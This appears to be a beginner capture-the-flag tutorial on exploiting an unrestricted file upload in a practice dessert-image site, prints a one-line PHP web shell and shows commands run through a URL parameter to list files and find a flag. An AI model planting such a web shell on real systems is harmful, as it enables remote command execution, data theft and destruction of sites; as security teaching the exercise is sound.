# Dessert Database File Upload Exploitation
This page will help you learn how Alice and Bob's dessert database works
and help you hack into it just like those L33k3ers!

![USA Cake](https://d213sdapb08052.cloudfront.net/assets/recipes/flag-cake/_ogImage/IMG_1153.jpeg?mtime=20200521120223)

## Lets Begin
First, lets begin by going to the database itself...
> <a href="http://desserts.gel.webfactional.com/" target="_blank">DATABASE</a>

Here you will see the option to upload a picture of your favorite dessert!

Go ahead, find a picture of your favorite dessert, download the image to your computer, then upload!

Cool right?

Now here is the part that Alice and Bob want you to pay close attention to...

## Exploit
We want you to download this file below...

> <a href="https://udel.codes/cyber2/Hack.php" target="_blank">Hacky File</a>

The contents of this file are the following

`<? print_r(system($_GET['cmd'])); ?>`

What this line of code does is it allows for us to inject (enter) bash commands into the url. These bash commands can do all types of malicious things such as go list all the files the website contains, delete files, ect. We could destroy the website if we wanted to!

**But we won't do that cause we are not the L33k3ers!**

Now that you know what know what this file does, upload that file just as you did with your dessert image

Once you do that, you will be directed to a page that says 
> We got your cake image: /cakes/Hack.php

With a little image underneath

**Right click** on this image and select, **"Open Image in new Tab"**

Once at the new webpage, go to the url and at the very end put this statement...

`?cmd=ls`

Hit enter, and now you see a list of all the files that the website contains! Crazy right! 

The command that is executed is directly after the `=`, so like we learned in the bash tutorial, `ls` prints all the contents of a directory. Now, find the **flag!**

## You are truly becoming an expert!

You are getting better with every exercise, Bob and Alice are proud and present you with this badge. Throw it on your website to mark your accomplishments!

![Dessert Exploitation](https://udel.codes/cyber2/Dessert_Exploitation.png)







